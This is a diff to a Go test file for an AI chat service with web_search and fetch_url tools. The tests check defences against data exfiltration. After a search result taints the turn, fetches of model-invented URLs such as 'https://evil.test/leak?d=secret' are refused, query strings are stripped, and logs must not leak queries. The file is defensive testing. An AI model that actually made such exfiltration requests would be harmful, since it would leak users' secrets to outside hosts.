@@ -1,8 +1,13 @@
 package chat
 
 import (
+	"bytes"
 	"context"
 	"errors"
+	"fmt"
+	"io"
+	"log"
+	"os"
 	"strings"
 	"sync"
 	"testing"
@@ -503,10 +508,11 @@ func TestExfiltrationGuard(t *testing.T) {
 }
 
 func TestFetchURLAllowList(t *testing.T) {
-	r := newRig(t, nil, toolStep(call("1", "fetch_url", `{"url":"https://evil.test/leak?d=secret"}`)), textStep("ok"))
+	// tainted turn (a search already ran): unknown URLs are refused
+	r := newRig(t, nil, toolStep(call("0", "web_search", `{"query":"q"}`)), toolStep(call("1", "fetch_url", `{"url":"https://evil.test/leak?d=secret"}`)), textStep("ok"))
 	r.ask("đọc https://e.test/x giúp")
-	if got := r.toolResult(1); !strings.Contains(got, "chỉ đọc link người dùng gửi") {
-		t.Errorf("model-invented URL fetched: %q", got)
+	if got := lastTool(r.sc.calls[2]); !strings.Contains(got, "chỉ đọc link người dùng gửi") {
+		t.Errorf("model-invented URL fetched after taint: %q", got)
 	}
 	// URL returned by this turn's web_search is allowed
 	r = newRig(t, nil, toolStep(call("1", "web_search", `{"query":"q"}`)), toolStep(call("2", "fetch_url", `{"url":"https://x.test/a"}`)), textStep("ok"))
@@ -655,5 +661,101 @@ func TestToolCallIDsAnsweredExactlyOnce(t *testing.T) {
 	}
 	if len(r.snd.md) != 1 {
 		t.Error("no reply")
+	}
+}
+
+func TestFetchUntaintedModelURL(t *testing.T) {
+	// untainted turn: model-proposed public URL is allowed, bare host normalised, query/fragment stripped
+	for in, want := range map[string]string{
+		"github.com/trending":                        "page of https://github.com/trending",
+		"https://github.com/trending?since=weekly#a": "page of https://github.com/trending\n",
+		"http://example.org/a?d=secret":              "page of http://example.org/a\n",
+	} {
+		r := newRig(t, nil, toolStep(call("1", "fetch_url", `{"url":"`+in+`"}`)), textStep("ok"))
+		r.ask("GitHub trending hôm nay có gì?")
+		if got := r.toolResult(1); !strings.Contains(got, want) || strings.Contains(got, "secret") || strings.Contains(got, "since") {
+			t.Errorf("%q -> %q", in, got)
+		}
+	}
+	// URL from user text or search keeps its query
+	r := newRig(t, nil, toolStep(call("1", "fetch_url", `{"url":"e.test/x?a=1"}`)), textStep("ok"))
+	r.ask("xem https://e.test/x?a=1 nhé")
+	if got := r.toolResult(1); !strings.Contains(got, "page of https://e.test/x?a=1") {
+		t.Errorf("user URL query lost: %q", got)
+	}
+	r = newRig(t, func(tl *Tools) { tl.Search = &fakeSearch{} }, toolStep(call("1", "web_search", `{"query":"q"}`)), toolStep(call("2", "fetch_url", `{"url":"https://x.test/a"}`)), textStep("ok"))
+	r.ask("tìm")
+	if got := lastTool(r.sc.calls[2]); !strings.Contains(got, "page of https://x.test/a") {
+		t.Errorf("search URL refused: %q", got)
+	}
+	// invalid inputs
+	for _, in := range []string{"localhost", "ftp://x.test/a", "https://u:p@x.test/", "https://x.test:8080/", "a b.com"} {
+		r := newRig(t, nil, toolStep(call("1", "fetch_url", `{"url":"`+in+`"}`)), textStep("ok"))
+		r.ask("hi")
+		if got := r.toolResult(1); !strings.Contains(got, "URL không hợp lệ") {
+			t.Errorf("%q accepted: %q", in, got)
+		}
+	}
+}
+
+type errSearch struct{ err error }
+
+func (e errSearch) Search(context.Context, string, int) ([]WebHit, error)     { return nil, e.err }
+func (e errSearch) SearchNews(context.Context, string, int) ([]WebHit, error) { return nil, e.err }
+
+func TestToolErrorReasonLogged(t *testing.T) {
+	var buf bytes.Buffer
+	log.SetOutput(&buf)
+	defer log.SetOutput(os.Stderr)
+	r := newRig(t, func(tl *Tools) { tl.Search = errSearch{errors.New("serper status 400")} },
+		toolStep(call("1", "web_search", `{"query":"super secret query"}`)), toolStep(call("2", "fetch_url", `{"url":"https://evil.test/p?k=v"}`)),
+		toolStep(call("3", "fetch_url", `{"url":"http://localhost:99/x"}`)), textStep("ok"))
+	r.ask("tìm")
+	out := buf.String()
+	for _, want := range []string{"name=web_search", "reason=serper_status_400", "name=fetch_url", "reason=url_not_allowed", "reason=invalid_url"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("log missing %q:\n%s", want, out)
+		}
+	}
+	for _, bad := range []string{"secret query", "evil.test", "k=v"} {
+		if strings.Contains(out, bad) {
+			t.Errorf("log leaks %q", bad)
+		}
+	}
+	if got := r.toolResult(1); !strings.Contains(got, "tool failed") {
+		t.Errorf("user-facing text not generic: %q", got)
+	}
+}
+
+func TestReasonOf(t *testing.T) {
+	for in, want := range map[error]string{
+		errors.New("serper status 403"):                  "serper_status_403",
+		fmt.Errorf("serper request: %w", io.EOF):         "serper_transport",
+		errors.New("web search: api key not configured"): "serper_no_key",
+		errFetchFailed:     "fetch_failed",
+		errUnsupportedURL:  "invalid_url",
+		errFetchRefused:    "fetch_refused",
+		errors.New("boom"): "tool_error",
+	} {
+		if got := reasonOf(in); got != want {
+			t.Errorf("reasonOf(%v)=%q want %q", in, got, want)
+		}
+	}
+}
+
+func TestPromptHasLiveWebRule(t *testing.T) {
+	p := (&Service{}).systemPromptFor(time.Now())
+	for _, w := range []string{"web_search", "fetch_url", "https://github.com/trending", "đừng chỉ gửi link"} {
+		if !strings.Contains(p, w) {
+			t.Errorf("prompt missing %q", w)
+		}
+	}
+}
+
+func TestCondenseReader(t *testing.T) {
+	in := "## Navigation Menu\n\n[](https://github.com/)\n*   [Sign in](https://x/y)\n" + strings.Repeat("x", 2000) + "\n## [a / b](https://github.com/a/b)\ndesc ![i](https://img/1.png) end\n"
+	got := condenseReader(in)
+	if got != "## Navigation Menu\n## [a / b](https://github.com/a/b)\ndesc  end" {
+		t.Errorf("got %q", got)
 	}
 }
